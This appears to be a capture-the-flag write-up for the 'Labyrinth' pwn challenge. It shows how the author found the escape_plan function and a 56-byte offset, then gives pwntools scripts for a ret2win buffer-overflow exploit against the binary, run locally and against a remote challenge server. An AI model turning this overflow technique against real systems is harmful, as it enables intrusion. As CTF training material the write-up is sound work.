---
title: Labyrinth
tags:
  - CTF
  - Pwn
---
If we unzip the file, we get the following content:

![](Pasted%20image%2020241013140534.png)

![](Pasted%20image%2020241013140820.png)

So let's open the binary with **Ghidra**:

![](Pasted%20image%2020241013140705.png)

We can inspect the `main` function. Basically, if we input 69 or 069 that will lead to the correct door:

![](Pasted%20image%2020241013140951.png)

![](Pasted%20image%2020241013140915.png)

Now, no matter what input you enter because it does not work. So it was time to apply a buffer overflow attack. It's time to create a python script. During the decompiled source code inspection, I saw the `escape_plan` function, which shows the flag:

![](Pasted%20image%2020241013141153.png)

So I first needed the address of that function:

```shell
objdump -d labyrinth | grep escape

0000000000401255 <escape_plan>:
  4012cd:       79 2e                   jns    4012fd <escape_plan+0xa8>
  401316:       7f cd                   jg     4012e5 <escape_plan+0x90
```

So its address is `0x401255`. I tried different offsets to rip the register and inject the address of the function. The offset is ***56***. The script is:

```python
#!/usr/bin/python3.8
from pwn import *

def print_lines(io):
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

binary_path = "labyrinth"
elf         = ELF(binary_path)
offset = 56
# new_rip = p64(elf.symbols["escape_plan"])     # 0x401255 is not multiple of 8 !!!
return_address = p64(elf.symbols["main"])

payload = b"".join(
    [
        b"A"  * offset,
        # new_rip,                              # get rid of this and use 0x401256
        b'\x56\x12\x40\x00\x00\x00\x00\x00', # needed to be written in reverse
        return_address
    ]
)

with open("payload", "wb") as filp:
    filp.write(payload)

io = process(elf.path)
io.recvregex(b'>>')
io.sendline(b'069')
io.recvregex(b'>>')
io.sendline(payload)
print_lines(io)
```

![](Pasted%20image%2020241013141620.png)

It worked!, so it was time to create a script for the remote version:

```python
#!/usr/bin/python3.8
from pwn import *

def print_lines(io):
    info("---Printing io received lines---")
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

# Setup and open connection
IP   = '165.227.224.40' # Change this
PORT = 30575            # Change this
r    = remote(IP, PORT)

# Craft payload
offset = 56
padding = b"A" * offset
retaddr = p64(0x401256)
payload = b"".join([padding, retaddr])

# Wait for prompt
print(r.recvregex(b'>>').decode())

# Send first input
r.sendline(b'069')

# Wait for new prompt
print(r.recvregex(b'>>').decode())

# Send payload
r.sendline(payload)

# Get the flag !
print_lines(r)
```

![](Pasted%20image%2020241013141821.png)